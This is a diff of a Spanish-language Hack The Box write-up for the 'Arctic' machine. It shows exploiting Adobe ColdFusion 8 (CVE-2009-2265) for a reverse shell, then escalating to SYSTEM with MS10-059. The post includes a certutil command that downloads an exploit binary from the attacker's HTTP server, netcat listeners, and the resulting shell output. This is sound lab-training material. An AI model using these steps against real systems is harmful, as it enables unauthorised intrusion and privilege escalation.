@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Arctic - Hack The Box
-excerpt: "Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el Exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el MS10-059 para ganar acceso como NT Authority System."
+excerpt: "Una máquina algo sencilla, vamos a vulnerar el servicio Adobe ColdFusion 8 usando el Exploit CVE-2009-2264 que nos conectara directamente a la máquina usando una Reverse Shell, entraremos como usuario y usaremos el Exploit MS10-059 para escalar privilegios y convertirnos en NT Authority System."
 date: 2023-02-17
 classes: wide
 header:
@@ -16,24 +16,32 @@ tags:
   - FTMP
   - Adobe ColdFusion
   - Remote Command Execution (RCE) 
-  - RCE - CVE-2009-2265
+  - CVE-2009-2265 (RCE)
   - Reverse Shell
   - System Recognition (Windows)
   - Local Privilege Escalation (LPE) 
-  - LPE - MS10-059
+  - Privesc - MS10-059 (LPE)
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-artic/artic_logo.png)
-Una máquina algo sencilla, vamos a vulnerar el servicio **Adobe ColdFusion 8** usando el Exploit **CVE-2009-2264** que nos conectara directamente a la máquina usando una **Reverse Shell**, entraremos como usuario y usaremos el **MS10-059** para ganar acceso como **NT Authority System**.
 
+Una máquina algo sencilla, vamos a vulnerar el servicio **Adobe ColdFusion 8** usando el Exploit **CVE-2009-2264** que nos conectara directamente a la máquina usando una **Reverse Shell**, entraremos como usuario y usaremos el Exploit **MS10-059** para escalar privilegios y convertirnos en **NT Authority System**.
+
+-------
 **ADVERTENCIA**:
 Esta máquina es bastante lenta, en su momento me desespere, pero *"la paciencia es la madre de la ciencia"*, advertido estas.
 
+-------
+
 Herramientas utilizadas:
+* *ping*
 * *nmap*
+* *searchsploit*
 * *python*
 * *nc*
+* *python2*
 * *windows-exploit-suggester.py*
+* *python3*
 * *certutil.exe*
 
 
@@ -63,12 +71,11 @@ Herramientas utilizadas:
 		<li><a href="#Post">Post Explotación</a></li>
 				<ul>
 					<li><a href="#Enum">Enumeración de Máquina</a></li>
-					<li><a href="#PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</a></li>
-				</ul>
-		<li><a href="#Otras">Otras Formas</a></li>
-                        	<ul>
-                                	<li><a href="#PruebaExp3">Prueba Exploit: Adobe ColdFusion - Directory Traversal</a></li>
-                                	<li><a href="#PruebaExp4">Prueba Exploit: Juicy Potato</a></li>
+					<ul>
+						<li><a href="#PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</a></li>
+	                                	<li><a href="#PruebaExp3">Prueba Exploit: Adobe ColdFusion - Directory Traversal</a></li>
+                	                	<li><a href="#PruebaExp4">Prueba Exploit: Juicy Potato</a></li>
+					</ul>
                         	</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -79,10 +86,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -193,16 +197,12 @@ Orale, es un protocolo interesante, es muy similar al **protocolo SMTP** y resul
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
 <h2 id="Investigacion2">Entrando al Protocolo FMTP desde la Web</h2>
-
 
 Entremos:
 
@@ -241,10 +241,7 @@ Entonces, se esta implementando una aplicación web, por eso las credenciales qu
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -252,7 +249,7 @@ Entonces, se esta implementando una aplicación web, por eso las credenciales qu
 <h2 id="Exploit">Buscando un Exploit</h2>
 
 Como ya tenemos un servicio específico y la versión, entonces vamos a usar **Searchsploit**
-```
+```bash
 searchsploit adobe coldfusion 8
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -299,7 +296,7 @@ Analizándo el Exploit, nos pide los siguientes datos:
 ```bash
 if __name__ == '__main__':
     # Define some information
-    lhost = '10.10.16.4'
+    lhost = 'IP_random'
     lport = 4444
     rhost = "10.10.10.11"
     rport = 8500
@@ -346,7 +343,7 @@ Content-Type: text/plain
 ```bash
 nc -nvlp 443    
 listening on [any] 443 ...
-connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49408
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.11] 49408
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\ColdFusion8\runtime\bin>whoami
@@ -355,7 +352,7 @@ arctic\tolis
 ```
 
 La flag del usuario se encuentra en el directorio **tolis**:
-```
+```batch
 C:\Users>dir
 dir
  Volume in drive C has no label.
@@ -375,10 +372,7 @@ dir
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -386,7 +380,7 @@ dir
 <h2 id="Enum">Enumeración de Máquina</h2>
 
 Bueno ya estamos dentro, vamos a ver de qué nos podemos aprovechar para poder ganar acceso como Root.
-```shell
+```batch
 C:\>cd Program Files
 cd Program Files
 C:\Program Files>dir
@@ -426,7 +420,7 @@ cd ..
 Pues no hay que sepa que podamos usar. 
 
 Veamos que privilegios tenemos:
-```shell
+```batch
 C:\>whoami /priv
 whoami /priv
 
@@ -443,7 +437,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 Tenemos el **SeImpersonatePrivilege** podemos aprovecharnos de ese, pero vamos a usar la herramienta **Windows Exploit Suggester** a ver que nos dice. 
 
 Recuerda que vamos a necesitar la información del sistema, usa el comando **systeminfo** y copia todo en un archivo **.txt**.
-```shell
+```batch
 python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
 [*] initiating winsploit version 3.3...
 [*] database file detected as xls or xlsx based on extension
@@ -469,26 +463,25 @@ python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.t
 [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
 [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
 ```
-Hay varios Exploits que podemos usar, vamos a usar el **MS10-059** para poder ganar acceso como Root.
+Hay varios Exploits que podemos usar, vamos a usar el **MS10-059** para poder ganar acceso como **Root**.
 
 <br>
 
 <h3 id="PruebaExp2">Probando Exploit: MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799)</h3>
 
 Para descargarlo, usaremos el siguiente link:
-
-* https://github.com/SecWiki/windows-kernel-exploits
+* <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">Repositorio de SecWiki: Windows-kernel-exploits</a>
 
 Una vez descargado, lo pasamos a nuestro directorio de trabajo y lo vamos a subir a la máquina para activarlo, vámonos por pasos:
 
-* Abrimos un servidor con Python:
+* Abrimos un servidor con **Python**:
 ```bash
 python3 -m http.server                                                                     
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 * Nos vamos a la carpeta **Temp** y creamos la carpeta **Privesc** para guardar ahí el Exploit:
-```shell
+```batch
 c:\>cd Windows/Temp
 cd Windows/Temp
 c:\Windows\Temp>dir
@@ -503,9 +496,9 @@ cd Privesc
 ```
 
 * Descargamos el Exploit desde la máquina usando **certutil.exe**:
-```shell
-c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
-certutil.exe -urlcache -split -f http://10.10.14.14:8000/MS10-059.exe MS10-059.exe
+```batch
+c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://Tu_IP:8000/MS10-059.exe MS10-059.exe
+certutil.exe -urlcache -split -f http://Tu_IP:8000/MS10-059.exe MS10-059.exe
 ****  Online  ****
   000000  ...
   0bf800
@@ -519,9 +512,9 @@ listening on [any] 1337 ...
 ```
 
 * Activamos el exploit:
-```shell
-c:\Windows\Temp\Privesc>MS10-059.exe 10.10.14.14 1337
-MS10-059.exe 10.10.14.14 1337
+```batch
+c:\Windows\Temp\Privesc>MS10-059.exe Tu_IP 1337
+MS10-059.exe Tu_IP 1337
 /Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
 ```
 
@@ -529,26 +522,13 @@ MS10-059.exe 10.10.14.14 1337
 ```bash
 nc -nvlp 1337     
 listening on [any] 1337 ...
-connect to [10.10.14.14] from (UNKNOWN) [10.10.10.11] 49790
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.11] 49790
 Microsoft Windows [Version 6.1.7600]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 c:\Windows\Temp\Privesc>whoami
 whoami
 nt authority\system
 ```
-
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
 
 La verdad esta máquina se me hizo algo pesada, porque es muy tardado el uso de los servicios que esta usando, lo que te puede llegar a aburrir y frustrar, pero no te desesperes, pues puede que algún día te toque auditar servicios así de lentos. Veamos que otra cosa se puede probar.
 
@@ -559,8 +539,7 @@ La verdad esta máquina se me hizo algo pesada, porque es muy tardado el uso de 
 Existe otra forma de acceder a la máquina como usuario, para esto usaríamos el Exploit **Adobe ColdFusion - Directory Traversal**.
 
 En el siguiente link, te explica cómo puedes obtener las credenciales para acceder al **Adobe ColdFusion** y usar una vulnerabilidad para cargar un Payload que tenga una **Reverse Shell** para que puedas accesar al sistema:
-
-* https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/
+* <a href="https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/" target="_blank">ColdFusion directory traversal FAQ (CVE-2010-2861)</a>
 
 Este link viene en dicho Exploit: **CVE-2010-2861**
 
@@ -569,23 +548,21 @@ Este link viene en dicho Exploit: **CVE-2010-2861**
 <h3 id="PruebaExp4">Prueba Exploit: Juicy Potato</h3>
 
 Después de usar el **Windows Exploit Suggester**, intente probar algunos Exploits, estos son:
-* MS11-011
-* MS10-047
-* MS11-046
+* *MS11-011*
+* *MS10-047*
+* *MS11-046*
 
 El último lo utilizamos en la **máquina Devel** pero aquí no funciono ni ese ni los otros que liste. Quizá a ti te funcionen, pruébalos si tienes tiempo y si no pues ve a lo seguro.
 
-He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tú.
+He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es una variante del **Juicy** o el mismo que el **MS10-059**, no lo sé bien, aunque yo no probe **Juicy Potato** puedes intentarlo tú.
 
 
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
+
 
 * https://www.mailjet.com/es/blog/emailing/servidor-smtp/
 * https://github.com/0xkasra/CVE-2009-2265
@@ -598,3 +575,48 @@ He notado que otras personan han usado **Juicy Potato** o **Churraskito** que es
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
